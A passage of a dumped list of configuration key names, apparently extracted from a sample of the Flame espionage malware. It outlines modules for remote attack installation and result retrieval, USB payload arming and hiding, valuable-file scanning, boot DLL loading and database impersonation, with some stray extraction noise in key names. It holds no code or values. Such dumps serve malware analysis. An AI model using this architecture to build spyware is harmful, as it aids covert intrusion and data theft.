nBOOST.EXTENSIONS.48.next\nBOOST.EXTENSIONS.48.prev\nBOOST.EXTENSIONS.49\nBOOST.EXTENSIONS.49.data\nBOOST.EXTENSIONS.49.data.EXT\nBOOST.EXTENSIONS.49.data.GRADE\nBOOST.EXTENSIONS.49.next\nBOOST.EXTENSIONS.49.prev\nBOOST.EXTENSIONS.5\nBOOST.EXTENSIONS.5.data\nBOOST.EXTENSIONS.5.data.EXT\nBOOST.EXTENSIONS.5.data.GRADE\nBOOST.EXTENSIONS.5.next\nBOOST.EXTENSIONS.5.prev\nBOOST.EXTENSIONS.50\nBOOST.EXTENSIONS.50.data\nBOOST.EXTENSIONS.50.data.EXT\nBOOST.EXTENSIONS.50.data.GRADE\nBOOST.EXTENSIONS.50.next\nBOOST.EXTENSIONS.50.prev\nBOOST.EXTENSIONS.51\nBOOST.EXTENSIONS.51.data\nBOOST.EXTENSIONS.51.data.EXT\nBOOST.EXTENSIONS.51.data.GRADE\nBOOST.EXTENSIONS.51.next\nBOOST.EXTENSIONS.51.prev\nBOOST.EXTENSIONS.6\nBOOST.EXTENSIONS.6.data\nBOOST.EXTENSIONS.6.data.EXT\nBOOST.EXTENSIONS.6.data.GRADE\nBOOST.EXTENSIONS.6.next\nBOOST.EXTENSIONS.6.prev\nBOOST.EXTENSIONS.7\nBOOST.EXTENSIONS.7.data\nBOOST.EXTENSIONS.7.data.EXT\nBOOST.EXTENSIONS.7.data.GRADE\nBOOST.EXTENSIONS.7.next\nBOOST.EXTENSIONS.7.prev\nBOOST.EXTENSIONS.8\nBOOST.EXTENSIONS.8.data\nBOOST.EXTENSIONS.8.data.EXT\nBOOST.EXTENSIONS.8.data.GRADE\nBOOST.EXTENSIONS.8.next\nBOOST.EXTENSIONS.8.prev\nBOOST.EXTENSIONS.9\nBOOST.EXTENSIONS.9.data\nBOOST.EXTENSIONS.9.data.EXT\nBOOST.EXTENSIONS.9.data.GRADE\nBOOST.EXTENSIONS.9.next\nBOOST.EXTENSIONS.9.prev\nBOOST.EXTENSIONS.first\nBOOST.EXTENSIONS.free\nBOOST.EXTENSIONS.last\nBOOST.EXTENSIONS.size\nBOOST.FILE_AGE_FACTOR\nBOOST.FILE_AGE_MAX\nBOOST.FILE_SCANNER\nBOOST.FILE_SCANNER.FILE_TIME_TYPE\nBOOST.FILE_SCANNER.MAX_FILE_AGE_IN_DAYS\nBOOST.FILE_SCANNER.MAX_FILE_SIZE\nBOOST.FILE_SCANNER.MAX_SCAN_DEPTH\nBOOST.FILE_SCANNER.MAX_VALUABLE_FILES\nBOOST.FILE_SCANNER.MIN_FILE_SIZE\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.1\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.1.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.1.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.1.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.1.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.2\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.2.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.2.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.2.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.2.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.3\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.3.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.3.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.3.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.3.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.4\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.4.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.4.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.4.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.4.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.5\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.5.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.5.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.5.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.5.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.6\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.6.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.6.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.6.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.6.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.7\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.7.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.7.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.7.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.7.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.8\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.8.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.8.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.8.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.8.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.9\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.9.data\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.9.data.DIR\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.9.next\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.9.prev\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.first\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.free\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.last\nBOOST.FILE_SCANNER.REJECTED_DIRECTORIES.size\nBOOST.FILE_SCANNER.SCAN_BURST_INTERVAL\nBOOST.FILE_SCANNER.SCAN_DELAY_INTERVAL\nBOOST.FILE_SCANNER.SCAN_DELAY_INTERVAL_USB\nBOOST.FILE_SCANNER.USE_HISTORY_USB\nBOOST.FILESIZES\nBOOST.FILESIZES.1\nBOOST.FILESIZES.1.data\nBOOST.FILESIZES.1.data.FILESIZE\nBOOST.FILESIZES.1.data.GRADE\nBOOST.FILESIZES.1.next\nBOOST.FILESIZES.1.prev\nBOOST.FILESIZES.2\nBOOST.FILESIZES.2.data\nBOOST.FILESIZES.2.data.FILESIZE\nBOOST.FILESIZES.2.data.GRADE\nBOOST.FILESIZES.2.next\nBOOST.FILESIZES.2.prev\nBOOST.FILESIZES.3\nBOOST.FILESIZES.3.data\nBOOST.FILESIZES.3.data.FILESIZE\nBOOST.FILESIZES.3.data.GRADE\nBOOST.FILESIZES.3.next\nBOOST.FILESIZES.3.prev\nBOOST.FILESIZES.first\nBOOST.FILESIZES.free\nBOOST.FILESIZES.last\nBOOST.FILESIZES.size\nBOOST.HISTORY_SIZE\nBOOST.MAX_RUN_TIME\nBOOST.MAX_STORAGE_PERCENT_USAGE\nBOOST.MAX_STORAGE_PRIORITY\nBOOST.MIN_STORAGE\nBOOST.MIN_STORAGE_PRIORITY\nBOOST.NON_ENGLISH_GRADE\nBOOST.RATIO\nBOOST.SHOULD_TREAT_ZIP_FILES_AS_DIRECTORIES\nBOOST.TIME_TO_WAIT_USB\nBOOST.TIMEDIFFS\nBOOST.TIMEDIFFS.1\nBOOST.TIMEDIFFS.1.data\nBOOST.TIMEDIFFS.1.data.GRADE\nBOOST.TIMEDIFFS.1.data.TIMEDIFF\nBOOST.TIMEDIFFS.1.next\nBOOST.TIMEDIFFS.1.prev\nBOOST.TIMEDIFFS.2\nBOOST.TIMEDIFFS.2.data\nBOOST.TIMEDIFFS.2.data.GRADE\nBOOST.TIMEDIFFS.2.data.TIMEDIFF\nBOOST.TIMEDIFFS.2.next\nBOOST.TIMEDIFFS.2.prev\nBOOST.TIMEDIFFS.3\nBOOST.TIMEDIFFS.3.data\nBOOST.TIMEDIFFS.3.data.GRADE\nBOOST.TIMEDIFFS.3.data.TIMEDIFF\nBOOST.TIMEDIFFS.3.next\nBOOST.TIMEDIFFS.3.prev\nBOOST.TIMEDIFFS.4\nBOOST.TIMEDIFFS.4.data\nBOOST.TIMEDIFFS.4.data.GRADE\nBOOST.TIMEDIFFS.4.data.TIMEDIFF\nBOOST.TIMEDIFFS.4.next\nBOOST.TIMEDIFFS.4.prev\nBOOST.TIMEDIFFS.first\nBOOST.TIMEDIFFS.free\nBOOST.TIMEDIFFS.last\nBOOST.TIMEDIFFS.size\nBOOT_DLL_LOADER\nBOOT_DLL_LOADER.BOOT_DLLS\nBOOT_DLL_LOADER.BOOT_DLLS.1\nBOOT_DLL_LOADER.BOOT_DLLS.1.data\nBOOT_DLL_LOADER.BOOT_DLLS.1.data.DLL_PATH\nBOOT_DLL_LOADER.BOOT_DLLS.1.data.HOME_ID\nBOOT_DLL_LOADER.BOOT_DLLS.1.data.START_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.1.data.START_PARAMS\nBOOT_DLL_LOADER.BOOT_DLLS.1.data.STOP_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.1.next\nBOOT_DLL_LOADER.BOOT_DLLS.1.prev\nBOOT_DLL_LOADER.BOOT_DLLS.2\nBOOT_DLL_LOADER.BOOT_DLLS.2.data\nBOOT_DLL_LOADER.BOOT_DLLS.2.data.DLL_PATH\nBOOT_DLL_LOADER.BOOT_DLLS.2.data.HOME_ID\nBOOT_DLL_LOADER.BOOT_DLLS.2.data.START_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.2.data.START_PARAMS\nBOOT_DLL_LOADER.BOOT_DLLS.2.data.STOP_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.2.next\nBOOT_DLL_LOADER.BOOT_DLLS.2.prev\nBOOT_DLL_LOADER.BOOT_DLLS.3\nBOOT_DLL_LOADER.BOOT_DLLS.3.data\nBOOT_DLL_LOADER.BOOT_DLLS.3.data.DLL_PATH\nBOOT_DLL_LOADER.BOOT_DLLS.3.data.HOME_ID\nBOOT_DLL_LOADER.BOOT_DLLS.3.data.START_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.3.data.START_PARAMS\nBOOT_DLL_LOADER.BOOT_DLLS.3.data.STOP_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.3.next\nBOOT_DLL_LOADER.BOOT_DLLS.3.prev\nBOOT_DLL_LOADER.BOOT_DLLS.4\nBOOT_DLL_LOADER.BOOT_DLLS.4.data\nBOOT_DLL_LOADER.BOOT_DLLS.4.data.DLL_PATH\nBOOT_DLL_LOADER.BOOT_DLLS.4.data.HOME_ID\nBOOT_DLL_LOADER.BOOT_DLLS.4.data.START_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.4.data.START_PARAMS\nBOOT_DLL_LOADER.BOOT_DLLS.4.data.STOP_FUNC\nBOOT_DLL_LOADER.BOOT_DLLS.4.next\nBOOT_DLL_LOADER.BOOT_DLLS.4.prev\nBOOT_DLL_LOADER.BOOT_DLLS.first\nBOOT_DLL_LOADER.BOOT_DLLS.firstia\nBOOT_DLL_LOADER.BOOT_DLLS.free\nBOOT_DLL_LOADER.BOOT_DLLS.last\nBOOT_DLL_LOADER.BOOT_DLLS.size\nBOOT_DLL_LOADER.BOOT_DLLS.sizea.R\nBOOT_DLL_LOADER.STOP_TIMEOUT_MS\nBOOT_DLL_LOADER.STOP_TIMEOUT_MSoI\nBUNNY\nBUNNY.BUNNY_ACTIVE\nBUNNY.BUNNY_KILLER_PATH\nBUNNY.BUNNY_WAIT_TIMEOUT_MS\nBUNNY.PLATYPUS_DLL_PATH\nCMDROUTER\nCMDROUTER.CMD_DIR_UPDATE_DELAY\nCMDROUTER.CMD_FILE_CHECK_DELAY\nCMDS.BB_FILES\nCMDS.BB_FILES.NEXT_RUN_TIME\nCMDS.BEETLEJUICE_STOP\nCMDS.BOOST\nCMDS.CLAN_ATTACK\nCMDS.CLAN_CLEAN_DB\nCMDS.CLAN_CREATE_DB_START_SNACK\nCMDS.CLAN_CREATE_DB_START_SNACK.SECS_BETWEEN_RUNS\nCMDS.CLAN_MERGE_RECORDS\nCMDS.CLAN_SEARCH_ENTS\nCMDS.CLAN_STORE_DB\nCMDS.CLAN_STORE_DB.MAX_RUNS\nCMDS.CLAN_STORE_DB.SECS_BETWEEN_RUNS\nCMDS.CSVDE\nCMDS.DELETE_UPGRADE_DLL\nCMDS.DELETE_UPGRADE_DLL.SECS_BETWEEN_RUNS\nCMDS.FLASK_FILES\nCMDS.GET_CONFIG\nCMDS.GET_CONFIG.CMD_BUF\nCMDS.GET_NETSETUP_SECLOG\nCMDS.JIMMY3_FILES.SECS_BETWEEN_RUNS\nCMDS.MIXER_MAPPING.CMD_BUF\nCMDS.SAMPLE_MICROBE.CMD_BUF\nCMDS.SNACK\nCMDS.SNACK.MAX_RUNS\nCMDS.SNACK.SECS_BETWEEN_RUNS\nCOMEXPS.CTrkEvntListener.1\nCOMSVCS.TrackerServer\nCRUISE.DOMAIN_QUESTIONING_TIMEOUT\nCRUISE.MAX_GROUP_DEPTH\nCRUISE.MAX_TOKENS\nCRUISE.RENEW_INTERVAL\nCRUISE.RENEW_INTERVALp8+\nDBQUERY\nDBQUERY.DB_QUERY_ABS_MAX_LOB_SIZE_B\nDBQUERY.DB_QUERY_ABS_MAX_VARCHAR_SIZE_B\nDBQUERY.DB_QUERY_NLS_LANG_NAME\nDBQUERY.DB_QUERY_NLS_LANG_VALUE\nDBQUERY.DB_QUERY_SLEEP_BETWEEN_ROWS_MS\nDBQUERY.DB_QUERY_SLEEP_EVERY_NUM_ROWS\nDBQUERY.IMPERSONATION\nDBQUERY.IMPERSONATION.DLLS\nDBQUERY.IMPERSONATION.DLLS.oracommon10\nDBQUERY.IMPERSONATION.DLLS.oraociei11\nDBQUERY.IMPERSONATION.DLLS.sqlsrv32\nDBQUERY.IMPERSONATION.DLLS.sqlunirl\nDBQUERY.IMPERSONATION.FILE_NAME\nDRILLER\nDRILLER.MAX_ENUM_DEVICES_RESULTS\nDRILLER.MAX_RESULT_WAIT_TIME\nDRILLER.MAX_WMI_RESULTS\nEUPHORIA\nEUPHORIA.ARMING_SESSIONS\nEUPHORIA.BlackList\nEUPHORIA.BlackList.first\nEUPHORIA.BlackList.free\nEUPHORIA.BlackList.last\nEUPHORIA.BlackList.size\nEUPHORIA.CLEANING_MODE\nEUPHORIA.DirsPrefixList\nEUPHORIA.DirsPrefixList.1\nEUPHORIA.DirsPrefixList.1.data\nEUPHORIA.DirsPrefixList.1.data.DirectoryPrefix\nEUPHORIA.DirsPrefixList.1.next\nEUPHORIA.DirsPrefixList.1.prev\nEUPHORIA.DirsPrefixList.2\nEUPHORIA.DirsPrefixList.2.data\nEUPHORIA.DirsPrefixList.2.data.DirectoryPrefix\nEUPHORIA.DirsPrefixList.2.next\nEUPHORIA.DirsPrefixList.2.nextURI\nEUPHORIA.DirsPrefixList.2.prev\nEUPHORIA.DirsPrefixList.2.prevD_P\nEUPHORIA.DirsPrefixList.first\nEUPHORIA.DirsPrefixList.free\nEUPHORIA.DirsPrefixList.last\nEUPHORIA.DirsPrefixList.size\nEUPHORIA.DRIVE_LETTERS_LIST\nEUPHORIA.EUPHORIA_BUFFER\nEUPHORIA.EUPHORIA_BUFFERa\nEUPHORIA.ExtraFolderList\nEUPHORIA.ExtraFolderList.1\nEUPHORIA.ExtraFolderList.1.data\nEUPHORIA.ExtraFolderList.1.data.ExtraFolder\nEUPHORIA.ExtraFolderList.1.data.ExtraFolderN\nEUPHORIA.ExtraFolderList.1.next\nEUPHORIA.ExtraFolderList.1.prev\nEUPHORIA.ExtraFolderList.first\nEUPHORIA.ExtraFolderList.free\nEUPHORIA.ExtraFolderList.last\nEUPHORIA.ExtraFolderList.size\nEUPHORIA.FLAME_BUFFER\nEUPHORIA.INTERVAL_BETWEEN_SESSIONS\nEUPHORIA.INTERVAL_BETWEEN_SESSIONSCS\nEUPHORIA.MAX_ARMINGS\nEUPHORIA.MUST_HIDE\nEUPHORIA.PayloadNamesList\nEUPHORIA.PayloadNamesList.1\nEUPHORIA.PayloadNamesList.1.data\nEUPHORIA.PayloadNamesList.1.data.PayloadName\nEUPHORIA.PayloadNamesList.1.next\nEUPHORIA.PayloadNamesList.1.prev\nEUPHORIA.PayloadNamesList.2\nEUPHORIA.PayloadNamesList.2.data\nEUPHORIA.PayloadNamesList.2.data.PayloadName\nEUPHORIA.PayloadNamesList.2.next\nEUPHORIA.PayloadNamesList.2.prev\nEUPHORIA.PayloadNamesList.3\nEUPHORIA.PayloadNamesList.3.data\nEUPHORIA.PayloadNamesList.3.data.PayloadName\nEUPHORIA.PayloadNamesList.3.next\nEUPHORIA.PayloadNamesList.3.prev\nEUPHORIA.PayloadNamesList.first\nEUPHORIA.PayloadNamesList.firstGR\nEUPHORIA.PayloadNamesList.free\nEUPHORIA.PayloadNamesList.last\nEUPHORIA.PayloadNamesList.last+\nEUPHORIA.PayloadNamesList.size\nEUPHORIA.PayloadNamesList.sizeAMS\nEUPHORIA.SHOULD_ARM\nEUPHORIA.SHOULD_HIDE_DIRS\nEUPHORIA.TTL\nEUPHORIA.USE_SELF_AS_BUFFER\nEUPHORIA.WhiteList\nEUPHORIA.WhiteList.first\nEUPHORIA.WhiteList.free\nEUPHORIA.WhiteList.freeMD\nEUPHORIA.WhiteList.last\nEUPHORIA.WhiteList.size\nFBS.FB_PRODUCTS_PRIORITY\nFBS.LEAK_SIZE\nFBS.Manager\nFBS.Manager.LoadInfectMedia\nFBS.MAX_STORAGE\nFBS.PHY\nFBS.PHY.CURRENT_MARK_VERSION\nFBS.PHY.HIGH_PERCENTAGE_USE\nFBS.PHY.IO_OPERATION_TIMEOUT\nFBS.PHY.LOW_PERCENTAGE_USE\nFBS.PHY.MARK_TIMEOUT\nFBS.PHY.MAXIMUM_MARK_SIZE\nFBS.PHY.MEDIA_USAGE_PERCENTAGE\nFBS.PHY.MIN_SIZE_IN_USE\nFBS.PHY.MINIMUM_MARK_SIZE\nFBS.PHY.RANDOM_FACTOR\nFBS.PHY.SHOULD_CLEAN_MEDIA\nFBS.PHY.SHOULD_MARK\nFBS.PHY.SIZE_CHECK_POINT_1\nFBS.PHY.SIZE_CHECK_POINT_2\nFBS.Retransmission\nFBS.Retransmission.RETRANSMISSION_COUNT\nFBS.Splitter\nFBS.Splitter.DIVISION\nFBS.Splitter.DIVISION.1\nFBS.Splitter.DIVISION.1.data\nFBS.Splitter.DIVISION.1.data.DIVISION_KEY\nFBS.Splitter.DIVISION.1.next\nFBS.Splitter.DIVISION.1.prev\nFBS.Splitter.DIVISION.2\nFBS.Splitter.DIVISION.2.data\nFBS.Splitter.DIVISION.2.data.DIVISION_KEY\nFBS.Splitter.DIVISION.2.next\nFBS.Splitter.DIVISION.2.prev\nFBS.Splitter.DIVISION.3\nFBS.Splitter.DIVISION.3.data\nFBS.Splitter.DIVISION.3.data.DIVISION_KEY\nFBS.Splitter.DIVISION.3.next\nFBS.Splitter.DIVISION.3.prev\nFBS.Splitter.DIVISION.first\nFBS.Splitter.DIVISION.free\nFBS.Splitter.DIVISION.last\nFBS.Splitter.DIVISION.size\nFBS.Splitter.MEDIA_LOG_ENTRIES\nFBS.Splitter.MEDIA_LOG_PRIORITY\nFBS.Transport\nFBS.Transport.MAX_BOOT_TRANSPORT_SIZE\nFBS.Transport.MIN_BOOT_TRANSPORT_SIZE\nFROG\nFROG.AgentAttackInterval\nFROG.AttackList\nFROG.AttackList.first\nFROG.AttackList.free\nFROG.AttackList.last\nFROG.AttackList.size\nFROG.AttackOpInterval\nFROG.AttacksEnabled\nFROG.DefaultAttacks\nFROG.DefaultAttacks.A-InstallFlame\nFROG.DefaultAttacks.A-InstallFlame.AgentIdentifier\nFROG.DefaultAttacks.A-InstallFlame.AttackTimeOut\nFROG.DefaultAttacks.A-InstallFlame.CommandLine\nFROG.DefaultAttacks.A-InstallFlame.DeleteServicePayload\nFROG.DefaultAttacks.A-InstallFlame.DeleteUploadedFiles\nFROG.DefaultAttacks.A-InstallFlame.Description\nFROG.DefaultAttacks.A-InstallFlame.FilesToRetrieve\nFROG.DefaultAttacks.A-InstallFlame.FilesToRetrieve.first\nFROG.DefaultAttacks.A-InstallFlame.FilesToRetrieve.free\nFROG.DefaultAttacks.A-InstallFlame.FilesToRetrieve.last\nFROG.DefaultAttacks.A-InstallFlame.FilesToRetrieve.size\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.data\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.data.BufferID\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.data.Filename\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.data.IsBufferIDAFilePath\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.data.ShouldDeleteFileOnSuccess\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.next\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.1.prev\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.data\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.data.BufferID\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.data.Filename\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.data.IsBufferIDAFilePath\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.data.ShouldDeleteFileOnSuccess\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.next\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.2.prev\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.first\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.free\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.last\nFROG.DefaultAttacks.A-InstallFlame.FilesToUpload.size\nFROG.DefaultAttacks.A-InstallFlame.HomeID\nFROG.DefaultAttacks.A-InstallFlame.MaxRetries\nFROG.DefaultAttacks.A-InstallFlame.RetriesLeft\nFROG.DefaultAttacks.A-InstallFlame.SampleInterval\nFROG.DefaultAttacks.A-InstallFlame.ServiceTimeOut\nFROG.DefaultAttacks.A-InstallFlame.ShouldRunCMD\nFROG.DefaultAttacks.A-InstallFlame.TTL\nFROG.DefaultAttacks.B-GetFlam\nFROG.DefaultAttacks.B-GetFlameResults\nFROG.DefaultAttacks.B-GetFlameResults.AgentIdentifier\nFROG.DefaultAttacks.B-GetFlameResults.AttackTimeOut\nFROG.DefaultAttacks.B-GetFlameResults.CommandLine\nFROG.DefaultAttacks.B-GetFlameResults.DeleteServicePayload\nFROG.DefaultAttacks.B-GetFlameResults.DeleteUploadedFiles\nFROG.DefaultAttacks.B-GetFlameResults.Description\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.1.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.10.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.11.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.2.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.3.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.4.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.5.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.6.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.7.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.data.StoragePriorityI\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.8.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.data\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.data.Filename\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.data.ShouldDelete\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.data.StoragePriority\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.next\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.9.prev\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.first\nFROG.DefaultAttacks.B-GetFlameResults.FilesToRetrieve.free\nF